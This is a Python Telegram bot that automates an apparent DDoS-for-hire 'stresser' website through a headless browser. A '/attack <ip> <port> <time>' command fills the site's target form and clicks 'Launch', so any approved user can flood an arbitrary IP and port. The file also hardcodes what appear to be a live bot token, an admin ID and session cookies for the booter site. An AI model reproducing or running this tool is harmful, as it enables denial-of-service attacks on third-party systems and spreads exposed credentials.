import time
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from playwright.async_api import async_playwright

# ==================== CONFIG ====================
BOT_TOKEN = "8521144614:AAHFv7ZbSzwklQwaRznTGKCeCzyGMZtZbQg"
ADMIN_ID = 7820814565

# Teri cookies
COOKIE_STRING = "__diamwall=0x1806789675; satellite_auth=27f6f658-66cc-49a5-aca1-fe0e1370ae08; satellite_captcha_verified=HC2.eyJ2IjoxLCJ1aWQiOiJiNjU2OWVjOGVjZjFkM2ZhIiwiaWF0IjoxNzcyNzkzNjAzMDU2LCJleHAiOjE3NzI4ODAwMDMwNTYsIm5vbmNlIjoiZTE1ZDE3NTRmZmIzZDE0YyJ9.MwIfPA2ywSnctGJLWKPtx5IMgrFdjyNrsDP4EDoVwJ8"

WEBSITE_URL = "https://satellitestress.st/attack"

# ==================== GLOBALS ====================
page = None
browser_ready = False
approved_users = {ADMIN_ID: time.time() + (365 * 86400)}
attack_active = False

# ==================== COOKIE PARSE ====================
def parse_cookies():
    cookies = []
    for item in COOKIE_STRING.split(';'):
        if '=' in item:
            name, value = item.strip().split('=', 1)
            cookies.append({
                'name': name,
                'value': value,
                'domain': '.satellitestress.st',
                'path': '/'
            })
    return cookies

# ==================== BROWSER INIT ====================
async def init_browser():
    global page, browser_ready
    try:
        p = await async_playwright().start()
        browser = await p.chromium.launch(headless=True)
        ctx = await browser.new_context()
        await ctx.add_cookies(parse_cookies())
        page = await ctx.new_page()
        await page.goto(WEBSITE_URL, wait_until='domcontentloaded')
        browser_ready = True
        print("✅ Browser ready")
    except Exception as e:
        print(f"❌ Browser error: {e}")

# ==================== BOT COMMANDS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🤖 Bot is online!\n/attack <ip> <port> <time>")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_active, page, browser_ready
    
    if not browser_ready:
        await update.message.reply_text("❌ Bot not ready yet")
        return
    
    if attack_active:
        await update.message.reply_text("⚠️ Another attack is running")
        return
    
    args = context.args
    if len(args) != 3:
        await update.message.reply_text("Usage: /attack <ip> <port> <time>")
        return
    
    ip, port, dur = args
    msg = await update.message.reply_text(f"🔄 Attacking {ip}:{port}...")
    
    try:
        attack_active = True
        await page.goto(WEBSITE_URL, wait_until='domcontentloaded')
        inputs = await page.query_selector_all('input[type="text"]')
        
        if len(inputs) >= 3:
            await inputs[0].fill(ip)
            await inputs[1].fill(port)
            await inputs[2].fill(dur)
            btn = await page.query_selector('button:has-text("Launch")')
            if btn:
                await btn.click()
                await msg.edit_text(f"✅ Attack launched!\n{ip}:{port} for {dur}s")
                await asyncio.sleep(int(dur))
                await update.message.reply_text("✅ Attack completed!")
            else:
                await msg.edit_text("❌ Button not found")
        else:
            await msg.edit_text("❌ Input fields missing")
    except Exception as e:
        await msg.edit_text(f"❌ Error: {e}")
    finally:
        attack_active = False

# ==================== RUN BOT ====================
if __name__ == "__main__":
    print("🤖 Starting bot...")
    
    # Create new event loop for browser
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(init_browser())
    
    # Start telegram bot in main thread
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))
    
    print("✅ Bot is running!")
    app.run_polling()  # No asyncio.run() inside!
